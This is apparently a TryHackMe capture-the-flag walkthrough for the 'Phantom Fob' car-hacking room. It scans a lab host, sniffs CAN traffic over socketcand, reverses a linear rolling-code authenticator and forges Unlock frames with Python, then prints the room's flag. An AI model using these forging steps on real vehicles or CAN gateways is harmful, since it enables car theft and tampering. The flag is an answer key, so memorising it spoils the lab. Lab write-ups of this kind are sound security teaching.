---
title: "TryHackMe Phantom Fob: Forge a CAN Bus Rolling Code"
date: 2026-11-17T18:33:00+05:30
lastmod: 2026-11-17T18:33:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
featureimage: img/thm-phantomfob/00-thumbnail.png

categories:
  - TryHackMe
tags:
  - tryhackme
  - thm
  - rooms
  - car hacking
  - CAN bus
  - socketcand
  - rolling code
  - SocketCAN
  - automotive security
  - reverse engineering
  - replay attack

draft: false
description: "TryHackMe Phantom Fob walkthrough: watch the CAN bus over socketcand, reverse the fob rolling-code scheme, and forge the Unlock frame to release the flag."
---

| <script src="https://tryhackme.com/badge/434937"></script>| <a class="twitter-follow-button" href="https://twitter.com/anir0y" data-size="large"> Follow @anir0y<a>|
|---|---|
|Phantom Fob |![Phantom Fob room icon](https://cdn-images.tryhackme.com/room-icons/685a887c7a55e244ac4eb469-1789472570064)|

Phantom Fob is a medium standalone car-hacking challenge, and it is a refreshing change from the usual web box. You are plugged into the CAN bus of a demo vehicle. You get a key fob that can Lock the car and sound the Horn, but has no Unlock button, and the manufacturer claims the unlock command "can't be copied." The room tagline gives the game away: "Codes change every second, forge the signal; don't replay it." So this is a rolling-code puzzle. Your job is to watch the bus, work out how the door commands are built, and craft a valid Unlock frame yourself. If you like protocol-level reversing, it sits next to my DFIR writeups like [Extracted](/post/thm-room-extractedroom/) and [Block](/post/thm-room-blockroom/), except here the protocol is SocketCAN.

Everything below runs from my Mac against the lab target over the THM VPN. There is no SSH login on the box, the only exposed services are a web instrument cluster and a CAN gateway.

## Mapping the attack surface

The lab machine exposes exactly two things worth poking.

```bash
  nmap -Pn --top-ports 100 10.82.164.34
  #  22/tcp   open  ssh
  #  8080/tcp open  http-proxy
  #  29536/tcp open  (socketcand)
```

Port 8080 is a Flask app, the car's instrument cluster. It has three routes: `/` (the dashboard), `/press` (POST a fob button) and `/events` (a server-sent-events stream of aggregate state). The fob only offers four controls, and anything else is rejected.

```bash
  curl -s -X POST http://10.82.164.34:8080/press -H 'Content-Type: application/json' -d '{"button":"LOCK"}'
  #  {"msg":"OK","ok":true}
  curl -s -X POST http://10.82.164.34:8080/press -H 'Content-Type: application/json' -d '{"button":"UNLOCK"}'
  #  {"msg":"no such control","ok":false}
```

The `/events` stream only ever carries cooked state, never raw frames:

```text
  data: {"locked": true, "immob": true, "horn": false, "speed": 29.3, "turn": 0, "fps": 194, "seen_ids": 9, "flag": null}
```

So the web app cannot inject arbitrary CAN traffic, and it will not hand you an Unlock button. The real bus is on port 29536, which is **socketcand**, the standard daemon that bridges a SocketCAN interface over TCP. That is where you watch the car's messages.

{{< ad >}}

## Watching the bus over socketcand

socketcand speaks a tiny text protocol. On connect it greets you with `< hi >`, you open a bus by name, switch to raw mode, and it starts streaming frames as `< frame ID timestamp data >`. You can also transmit with `< send ID dlc b0 b1 ... >`. A short Python client is all you need.

```python
  import socket, time, re
  s = socket.socket(); s.connect(("10.82.164.34", 29536))
  s.recv(100)                      # < hi >
  s.sendall(b"< open vcan0 >"); s.recv(100)   # < ok >
  s.sendall(b"< rawmode >"); s.recv(100)       # < ok >
  # now frames stream in
```

The bus on `vcan0` is busy. Most of it is decoy noise: IDs `227`, `321`, `16F`, `3D2` and `096` all broadcast continuously with rolling, random-looking payloads, exactly the kind of chaff that hides the one signal that matters. The trick is correlation. Press each fob button over HTTP and diff the bus. Only one ID fires in lockstep with a button press: **`5CE`**.

```text
  LOCK          -> < frame 5CE ... 2b861fffedc7d190 >
  HORN          -> < frame 5CE ... 2c881fb425c7d110 >
  IMMOB_ARM     -> < frame 5CE ... 2d501fc1ecc7d101 >
  IMMOB_DISARM  -> < frame 5CE ... 38b81f0388c7d1e8 >
```

That is the key fob. Now reverse how the eight bytes are built.

## Task 1: reverse the fob frame

Line up the LOCK samples captured at one-second intervals and the structure jumps out:

```text
  cnt b1 b2 b3b4 b5b6 cmd
  30  43 1f 29d9 c7d1 90
  31  a5 1f f609 c7d1 90
  32  e3 1f 98ea c7d1 90
  33  b8 1f e50d c7d1 90
  34  33 1f e78b c7d1 90
```

Fixed bytes first. Byte 2 is always `1f`, bytes 5 and 6 are always `c7 d1`. Byte 0 is a message counter that increments by one on every frame the fob sends. Byte 7 is the command selector:

```text
  0x90 = LOCK        0x10 = HORN
  0x01 = IMMOB_ARM   0xe8 = IMMOB_DISARM
```

That leaves bytes 1, 3 and 4. Watching repeated presses of the same button inside a single wall-clock second is what cracks it:

```text
  second 667, all LOCK:
  cnt=41  b1=37 b3b4=3ef3
  cnt=42  b1=37 b3b4=3ef4
  cnt=43  b1=37 b3b4=3ef5
```

Byte 1 and byte 3 stay constant for the whole second, and byte 4 increments by one per message. Cross a second boundary and byte 1 and byte 3 jump to a fresh random value. So `(b1, b3)` is a 16-bit rolling code that is reseeded every second. This is literally the "codes change every second" from the tagline.

Byte 4 is the interesting one. Press different buttons inside the same second and byte 4 changes with the command, not just with a counter:

```text
  second 785, base (b1,b3) = (97, af):
  cnt=63  cmd=10  b4=66
  cnt=64  cmd=01  b4=58
  cnt=65  cmd=90  b4=e8
```

Byte 4 is an authenticator that binds the counter and the command to the current second. Solve for it. Given `S` as a per-second secret, every sample fits:

```text
  b4 = (cnt + cmd + S) mod 256
```

Derive `S` from any single observed frame: `S = (b4 - cnt - cmd) mod 256`. For the frame above at `cnt=63, cmd=0x10, b4=0x66`, that gives `S = 0xf3`, and it reproduces `cnt=64` and `cnt=65` exactly. The rolling base `(b1,b3)` and the secret `S` are both fully determined by the current second, which means I can read both straight off a legitimate LOCK press and reuse them. That is the forge: not a replay of an old code, but a freshly computed authenticator for a command the fob never sends.

## Proving the forge with the Horn

Before touching the doors, validate the whole chain on something harmless and observable. Press LOCK, read its frame, derive `S`, then transmit a Horn frame one counter ahead with a recomputed byte 4.

```python
  # observed LOCK: 69af1f7acfc7d190 -> cnt0=0x69 base=(0xaf,0x7a) b4=0xcf cmd=0x90
  S = (0xcf - 0x69 - 0x90) & 0xff            # 0xd6
  cnt = 0x6a; cmd = 0x10                      # HORN
  b4  = (cnt + cmd + S) & 0xff               # 0x50
  s.sendall(b"< send 5CE 8 6A AF 1F 7A 50 C7 D1 10 >")
```

The cluster's `/events` stream flips `horn` from `false` to `true`. The forged frame was accepted, so the byte-4 formula and the send syntax are both correct.

## Task 1: forge the Unlock and grab the flag

The doors react to the same ID `5CE` with a different command byte, one the fob has no button for. The four known opcodes do not reveal it arithmetically, so sweep the command space. For each candidate I press LOCK to pull the current second's `base` and `S`, then send a forged frame with that command and a valid byte 4, and watch `/events` for `locked` dropping to `false`.

One gotcha cost me a full pass: the immobiliser. My first sweep sent `0x01` (IMMOB_ARM) early, and an armed immobiliser refuses to unlock the doors, so every later attempt silently failed. Keeping the immobiliser disarmed and skipping the arm and lock opcodes fixed it.

```python
  # press IMMOB_DISARM first, then for each candidate cmd:
  cnt += 1; send(cnt, bhi, blo, 0xe8, S)     # keep immobiliser disarmed
  cnt += 1; b4 = (cnt + cmd + S) & 0xff
  send(cnt, bhi, blo, cmd, S)                # try the unlock candidate
  # watch /events for locked == False
```

The doors pop on command byte **`0x29`**:

```text
  UNLOCKED at cmd=0x29
  locked: False   immob: False
  flag: THM{C4r_H4cking_is_kind4_c00l}
```

The flag releases on the bus the instant the car unlocks. The answer is **`THM{C4r_H4cking_is_kind4_c00l}`**.

## Two takeaways

First, a rolling code is only as strong as what it authenticates. This fob reseeds a 16-bit code every second so a naive replay fails, which is why the manufacturer claimed the signal "can't be copied." But the per-message authenticator was a plain linear function, `auth = counter + command + secret`, and both the rolling base and the secret are observable from one legitimate button press. Once you can read the current second's state off the wire, you can synthesize a frame for any command, including the one the fob deliberately omits. Replay protection does not help when the attacker can forge.

Second, decoys are not security. The bus drowned the one meaningful ID in five continuously chattering random streams, but a single round of press-and-diff isolated `5CE` in seconds. Observable side effects (the cluster's `horn` and `locked` fields) turned the whole thing into an oracle: press, observe, derive, forge, confirm. When a system leaks state, enumeration beats obfuscation.

Room solved 100%: 1 task, 1 answer.
